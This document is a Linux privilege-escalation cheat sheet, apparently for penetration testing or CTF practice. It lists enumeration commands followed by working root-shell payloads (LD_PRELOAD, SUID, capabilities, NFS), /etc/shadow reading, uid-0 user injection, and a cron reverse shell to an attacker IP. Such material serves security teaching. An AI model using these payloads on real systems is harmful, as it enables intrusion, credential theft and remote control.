## üîç Post-Compromise Enumeration

Enumeration is a critical step post-compromise. Accessing a system via a vulnerability or low-privileged account requires further enumeration to identify privilege escalation vectors. 

## üíª System Information

Gathering system and kernel information helps identify role and potential kernel vulnerabilities.


```bash
# Retrieve hostname to identify system role
hostname
```
* Tool: hostname

```bash
# Print detailed system and kernel information
uname -a
```
* Tool: uname

```bash
# Display kernel version and compiler information
cat /proc/version
```
* Tool: cat

```bash
# Display operating system identification
cat /etc/issue
```
* Tool: cat

## ‚öôÔ∏è Process and Environment Enumeration

Understanding running processes and environment variables reveals operational context and execution paths.


```bash
# View processes for current shell
ps
```
* Tool: ps

```bash
# View all running processes
ps -A
```
* Tool: ps

```bash
# View process tree format
ps axjf
```
* Tool: ps

```bash
# Show processes for all users, including non-terminal processes
ps aux
```
* Tool: ps

```bash
# Display environmental variables, including PATH
env
```
* Tool: env

## üë§ User and File Enumeration

Identifying user privileges, group memberships, and misconfigured file permissions.

```bash
# List user privilege level and group memberships
id
```
* Tool: id

```bash
# Obtain id information for a specific user
id <username>
```
* Tool: id

```bash
# List all files, including hidden files, with detailed permissions
ls -la
```
* Tool: ls

```bash
# Discover system users
cat /etc/passwd
```
* Tool: cat

```bash
# Extract users with home directories
grep "home" /etc/passwd
```
* Tool: grep

```bash
# Review command history for stored credentials
history
```
* Tool: history

## üì° Network Enumeration

Evaluating network interfaces, routing, and active connections for pivoting opportunities.


[Image of OSI Model Network Layers]


```bash
# Display network interfaces
ifconfig
```
* Tool: ifconfig

```bash
# View network routes
ip route
```
* Tool: ip

```bash
# Show all listening ports and established connections
netstat -a
```
* Tool: netstat

```bash
# List listening TCP ports
netstat -lt
```
* Tool: netstat

```bash
# Display network usage statistics by protocol
netstat -s
```
* Tool: netstat

```bash
# List connections with service name and PID (requires root for full output)
netstat -tp
```
* Tool: netstat

```bash
# Show interface statistics
netstat -i
```
* Tool: netstat

```bash
# Display all sockets, IPs instead of hostnames, and timers
netstat -ano
```
* Tool: netstat

## üîé File Searching

The find command locates critical files, writable directories, and misconfigured permissions.

```bash
# Find files by name in specific directories
find . -name target.txt
find /home -name target.txt
```
* Tool: find

```bash
# Find directories by name
find / -type d -name config
```
* Tool: find

```bash
# Find files with specific permissions
find / -type f -perm 0777
find / -perm a=x
```
* Tool: find

```bash
# Find files by owner
find /home -user frank
```
* Tool: find

```bash
# Find files based on modification or access time
find / -mtime 10
find / -atime 10
find / -cmin -60
find / -amin -60
```
* Tool: find

```bash
# Find files by size
find / -size 50M
find / -size +100M
```
* Tool: find

```bash
# Redirect errors to /dev/null for clean output
find / -size +100M 2>/dev/null
```
* Tool: find

```bash
# Find world-writable folders
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
```
* Tool: find

```bash
# Find world-executable folders
find / -perm -o x -type d 2>/dev/null
```
* Tool: find

```bash
# Find development tools
find / -name perl* 2>/dev/null
find / -name python* 2>/dev/null
find / -name gcc* 2>/dev/null
```
* Tool: find

## üß∞ Automated Enumeration Tools

Scripts designed to automate privilege escalation vector discovery. Usage depends on target environment constraints.

* LinPeas
* LinEnum
* LES (Linux Exploit Suggester)
* Linux Smart Enumeration
* Linux Priv Checker

## üîì Sudo Exploitation

Exploiting commands that a user is permitted to execute with root privileges via sudo. Verify allowed commands with sudo.

```bash
# List allowed sudo commands for the current user
sudo -l
```
* Tool: sudo

Applications without direct shell exploits can be leveraged via built-in functions. For Apache2:

```bash
# Read restricted files using alternate configuration file parameter
sudo apache2 -f /etc/shadow
```
* Tool: apache2


Exploiting LD_PRELOAD if `env_keep` is enabled for the environment variable.

```c
# C payload to spawn root shell via LD_PRELOAD
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
* Tool: gcc

```bash
# Compile shared object file
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
* Tool: gcc

```bash
# Execute allowed sudo command with malicious shared object
sudo LD_PRELOAD=/tmp/shell.so find
```
* Tool: sudo

## üõ°Ô∏è SUID and SGID Exploitation

SUID and SGID bits allow execution of files with the owner's or group's privileges.


```bash
# Find files with SUID or SGID bits set
find / -type f -perm -04000 -ls 2>/dev/null
```
* Tool: find

If `nano` possesses SUID owned by root, it can be used to read or modify restricted files.

```bash
# Read shadow file using SUID nano
nano /etc/shadow
```
* Tool: nano

```bash
# Prepare shadow and passwd for cracking
unshadow passwd.txt shadow.txt > passwords.txt
```
* Tool: unshadow

Alternatively, inject a new root-privileged user into `/etc/passwd`.

```bash
# Generate password hash for new user
openssl passwd -1 -salt newuser password123
```
* Tool: openssl

```bash
# Add new user string to /etc/passwd via SUID text editor
newuser:$1$newuser$HASH:0:0:root:/root:/bin/bash
```
* Tool: nano

```bash
# Switch to newly created root user
su newuser
```
* Tool: su

## ‚ö° Capabilities Exploitation

Capabilities provide granular privileges to binaries without requiring full SUID root assignment.

```bash
# Enumerate binary capabilities
getcap -r / 2>/dev/null
```
* Tool: getcap

If a binary like `vim` has the `cap_setuid+ep` capability, it can be exploited.

```bash
# Spawn root shell using vim capability payload
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
* Tool: vim

## ‚è±Ô∏è Cron Job Exploitation

Misconfigured scheduled tasks running as root can be manipulated to execute arbitrary payloads.


```bash
# Review system-wide cron jobs
cat /etc/crontab
```
* Tool: cat

If a writable script is scheduled by root, overwrite it with a reverse shell payload.

```bash
# Reverse shell payload for cron job
#!/bin/bash
bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1
```
* Tool: bash

```bash
# Catch reverse shell on attacker machine
nc -lvnp <port>
```
* Tool: nc

If a script is missing but still scheduled without an absolute path, create the script in a directory matching the cron PATH variable.

## üõ£Ô∏è PATH Variable Exploitation

If a SUID executable calls a binary without an absolute path, the PATH variable can be manipulated to execute a malicious binary from a writable directory.


```bash
# Find writable directories to host malicious binary
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```
* Tool: find

```bash
# Prepend writable directory to PATH
export PATH=/tmp:$PATH
```
* Tool: export

```bash
# Create malicious binary payload matching the targeted call
cp /bin/bash /tmp/<target_binary_name>
chmod +x /tmp/<target_binary_name>
```
* Tool: cp

Execute the vulnerable SUID binary to trigger the payload via the manipulated PATH.

## üìÅ NFS Root Squashing

NFS shares exported with `no_root_squash` allow a remote root user to write files with root ownership and retain SUID execution on the target system.


```bash
# Read exports to identify no_root_squash shares
cat /etc/exports
```
* Tool: cat

```bash
# Show mountable shares from attacker machine
showmount -e <target_ip>
```
* Tool: showmount

```bash
# Mount the share locally
mkdir /tmp/mount
mount -t nfs <target_ip>:<share_path> /tmp/mount
```
* Tool: mount

```c
# C payload for SUID shell execution
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```
* Tool: gcc

```bash
# Compile and set SUID bit on the mounted share as root
gcc nfs.c -o nfs
chmod +s nfs
```
* Tool: chmod

Execute the compiled binary on the target system to achieve root privileges.
